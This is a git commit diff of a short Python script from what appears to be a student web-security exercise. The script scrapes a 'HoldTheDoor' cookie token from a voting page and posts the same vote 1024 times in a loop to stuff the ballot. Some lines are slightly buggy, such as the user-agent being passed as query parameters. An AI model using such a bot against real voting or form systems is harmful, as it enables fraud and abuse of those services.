781c8931af16c22632c42322e6e51e3f6bd23671
Miguel22247 <nr2862002@gmail.com>
2021-05-31 18:39:40 -0300

    fixed?

--- level_2/level2.py
+++ level_2/level2.py
@@ -4,5 +4,15 @@
 """hodor for level 2"""
 import requests
 
-php = "http://158.69.76.135/level2.php"
-user_agent = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) ""Gecko/20100101 Firefox/64.0")
+page = "http://158.69.76.135/level2.php"
+Os = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) ""Gecko/20100101 Firefox/64.0")
+
+for i in range(0, 1024):
+	get = requests.get(page, Os)
+	cookies = get.cookies
+	dictionary = cookies.get_dict()
+	key = dictionary.get('HoldTheDoor')
+	payloader = {'id': '2780', 'key': key, 'holdthedoor': 'Enviar'}
+	result = requests.post(page, Os, data=payloader, cookies = cookies)
+	print("Vote n*{:d} send it with code {}".format(i, result, key))
+
